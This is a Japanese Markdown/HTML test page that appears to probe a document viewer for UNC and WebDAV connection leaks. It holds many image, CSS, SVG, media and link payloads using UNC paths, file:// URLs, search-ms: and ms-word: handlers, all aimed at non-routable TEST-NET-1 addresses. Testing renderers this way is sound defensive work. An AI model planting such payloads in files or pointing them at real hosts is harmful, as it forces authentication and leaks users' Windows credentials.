# UNC leak

経路ごとに宛先の最後の数字を変えている（192.0.2.0/24 は TEST-NET-1 で、どこにも届かない）。
SMB・WebDAV の接続を試みると、TCP の表に `192.0.2.N:445`（または 80/443）の SynSent が現れる。

## 開くだけ

![md-unc](\\192.0.2.11\s\a.png)
<img src="\\192.0.2.12\s\a.png">
<img src="file://192.0.2.13/s/a.png">
<img src="file:////192.0.2.14/s/a.png">
<img src="//192.0.2.15/s/a.png">
<img srcset="file://192.0.2.16/s/a.png 1x">
<div style="background-image:url('file://192.0.2.17/s/a.png')">css</div>
<svg width="10" height="10"><image href="file://192.0.2.18/s/a.png" width="10" height="10"/></svg>
<video poster="file://192.0.2.19/s/a.png"></video>
<img src="\\192.0.2.20@80\DavWWWRoot\a.png">
<img src="file://192.0.2.21@SSL/DavWWWRoot/a.png">
<input type="image" src="file://192.0.2.22/s/a.png">
<audio src="file://192.0.2.23/s/a.mp3"></audio>

![md-file](file://192.0.2.24/s/a.png)

<img src="https://192.0.2.25/ctrl.png">（陽性対照：https の画像は受け入れたリスク）

## クリック

<a href="file://192.0.2.31/s/a.md">UNCFILE31</a>

<a href="\\192.0.2.32\s\a.md">UNCBS32</a>

[MDLINK33](\\192.0.2.33\s\a.md)

<a href="search-ms:query=x&crumb=location:\\192.0.2.34\s">SEARCHMS34</a>

<a href="ms-word:ofe|u|file://192.0.2.35/s/a.docx">MSWORD35</a>
